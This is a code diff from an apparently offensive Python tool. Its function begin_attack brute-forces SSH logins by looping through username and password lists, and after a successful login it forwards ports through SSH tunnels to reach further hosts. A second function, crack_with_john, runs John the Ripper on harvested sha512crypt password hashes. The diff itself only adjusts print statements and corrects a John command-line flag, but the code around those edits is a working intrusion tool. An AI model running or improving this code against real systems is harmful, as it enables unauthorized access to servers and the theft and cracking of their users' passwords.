@@ -128,10 +128,11 @@ def begin_attack(client):
         while (userN < user_len) and (not logged_in):
             userCred = USERNAMES[userN]
             passwd = 0
-            print "USER: %s" % userCred
+            # print "USER: %s" % userCred
             while (passwd < passwd_len) and (not logged_in):
                 passCred = PASSWORDS[passwd]
                 try:
+                    print "%s : %s" % (userCred, passCred)
                     # if initial_comps > 0:
                     # if not initial_comps:
                     if server.initial:
@@ -182,7 +183,7 @@ def begin_attack(client):
                         forward_tunnel(compObj.local_forward, compObj.host, compObj.ssh_port, client.get_transport())
                         verbose('Now forwarding %s:%d to %s:%d ...' % ("localhost", compObj.local_forward, compObj.host, compObj.ssh_port))
                     except Exception as e:
-                        print "HERE: %s" % e
+                        print e
 
             # if we are logged in as root
             if log_root:
@@ -234,7 +235,7 @@ def crack_with_john(hashes_lst):
     print "Cracking newly found hashes...\n"
 
     # supress john output
-    os.system("john --format=sha512crypt --wordlist %s curr_hashes.txt > /dev/null 2>&1" % (WORDLIST))
+    os.system("john --format=sha512crypt --wordlist=%s curr_hashes.txt > /dev/null 2>&1" % (WORDLIST))
     # get only the user/pass output from john
     hashes = subprocess.Popen("john --show curr_hashes.txt | grep ':'", shell=True, stdout=subprocess.PIPE).communicate()[0]
 
